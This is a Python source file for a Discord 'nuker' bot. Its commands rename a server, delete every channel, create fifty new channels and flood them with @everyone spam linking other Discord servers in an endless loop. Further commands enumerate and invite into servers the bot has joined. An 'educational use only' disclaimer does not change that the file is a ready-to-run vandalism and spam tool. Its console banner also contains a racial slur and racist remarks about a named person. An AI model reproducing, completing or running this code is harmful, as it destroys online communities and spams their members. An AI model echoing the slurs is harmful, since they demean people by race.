import os
import time
from colorama import Fore
import discord
from discord.ext import commands
import threading
import asyncio

# THIS CODE IS FOR EDUCATIONAL USES ONLY, I AM NOT RESPONSIBLE FOR ANY DAMAGE DONE - Vermillion
# Contact Me At @dooringskids On Twitter Or CpSpreader On Discord  ( psst /fwendies )

prefix = "PREFIX HERE" # Start of the command (e.g -> .help)
token = ("TOKEN HERE") # Bot Token

channelname = "get nuked"

servername_1 = "NUKED BY VERMILLION"
spammessage_1 = '@everyone **#PACK SMOKED** \n https://discord.gg/fwendies https://discord.gg/gui https://discord.gg/ivi'

servername_2 = "NUKED BY VERMILLION - FWENDIES"
spammessage_2 = '@everyone **#PACK SMOKED** \n https://discord.gg/fwendies'

servername_3 = "NUKED BY VERMILLION - IVI"
spammessage_3 = '@everyone **#PACK SMOKED** \n https://discord.gg/ivi'

servername_4 = "NUKED BY VERMILLION - SYLUM" 
spammessage_4 = '@everyone **#PACK SMOKED** \n https://discord.gg/gui'


os.system('cls')

def title():
    print(Fore.LIGHTMAGENTA_EX + """
          _   __                               _  __         __             
        | | / / ___   ____  __ _   ___       / |/ / __ __  / /__ ___   ____
        | |/ / / -_) / __/ /  ' \ (_-<      /    / / // / /  '_// -_) / __/
        |___/  \__/ /_/   /_/_/_//___/     /_/|_/  \_,_/ /_/\_\ \__/ /_/   
                            /fwendies - By Vermillion
    """)

title()



client = commands.Bot(command_prefix=prefix,help_command=None, intents=discord.Intents.all())


@client.event
async def on_ready():
  print(f"Logged in as {client.user}")
  activity = discord.Game(name=f"Made By Vermillion - .run", type=3)
  await client.change_presence(status=discord.Status.dnd, activity=activity)

  os.system('cls')
  title()
  time.sleep(0.3)
  print(Fore.LIGHTRED_EX + f""" 
            ╔══════════════════════════════════════════════════════╗ 
            ║                                                      ║
            ║  Prefix = {prefix}                                          ║
            ║                                                      ║
            ║     - Command                                        ║ Bands 4 Bands
            ║       - run  (Nukes The Server)                      ║ Womp Womp
            ║         - 1 -> Option 1                              ║ Running Your Server
            ║         - 2 -> Option 2                              ║ Vermillion On Top
            ║         - 3 -> Option 3                              ║ {client.user} Is Not A Nuker
            ║         - 4 -> Option 4                              ║ Bitch Nigga
            ║       - server (Lists Servers The Bots In)           ║ Vozy Is Black
            ║       - invite server_id (Invite To That Server)     ║ Im A Skid
            ║       - leave (Bot Leaves The Server)                ║
            ║       - delc (Deletes Channels Then Bot Leaves)      ║
            ╚══════════════════════════════════════════════════════╝
  """)


# Threading DEF
def delete_channel(channel):
  asyncio.run_coroutine_threadsafe(channel.delete(), client.loop).result()

def create_channel(guild, channel_name):
  asyncio.run_coroutine_threadsafe(guild.create_text_channel(channel_name), client.loop).result()

@client.command()
async def run(ctx, option : int):
  await ctx.channel.purge(limit=1)

  if option == 1:
    servername = servername_1
  if option == 2:
    servername = servername_2
  if option == 3:
    servername = servername_3
  if option == 4:
    servername = servername_4
     
  await ctx.guild.edit(name=servername)

  # CHANNEL DELETE
  all_channels = ctx.guild.channels

  threads = (threading.Thread(target=delete_channel, args=(channel,)) for channel in all_channels)
  for thread in threads:
    thread.start()

  for thread in threads:
    thread.join()

  # CHANNEL CREATE
  guild = ctx.guild

  threads = (threading.Thread(target=create_channel, args=(guild, channelname)) for i in range(50))
  for thread in threads:
      thread.start()

  for thread in threads:
      thread.join()


@client.event
async def on_guild_channel_create(ctx):


  if ctx.guild.name == servername_1:
     spammessage = spammessage_1

  if ctx.guild.name == servername_2:
     spammessage = spammessage_2

  if ctx.guild.name == servername_3:
     spammessage = spammessage_3

  if ctx.guild.name == servername_4:
     spammessage = spammessage_4

  while True:
    await ctx.send(spammessage)
    await ctx.send(spammessage)
    
    
@client.command()
async def server(ctx):
  servers = list(client.guilds)
  for server in servers:
        ids = str(server.id)
        await ctx.send("Server Name: "+ server.name +"  |  Server ID: "+ ids +"\n----------------------------------")
  await ctx.send("Do **.commands** for the list of commands")
     
    
@client.command()
async def invite(ctx, server_id: int):
    try:
      guild = client.get_guild(server_id)
      invite = await guild.text_channels[0].create_invite()
      await ctx.send(f"Server Name: {guild.name} \nServer ID: {guild.id} \nServer Invite: {invite}")
    except:
        await ctx.send("**There was an error, check if you have put a Server ID there and if the bot had the permiss to invite.")
    
 
    
    
@client.command()
async def leave(ctx):
    try:
      await ctx.send("Bye Bye!")
      await ctx.guild.leave()
    except:
      await ctx.guild.leave()

@client.command()
async def delc(ctx):
  for channels in ctx.guild.channels:
    try:
      await channels.delete()
    except:
        pass
  await ctx.guild.leave()
 
    
   
    
client.run(token)
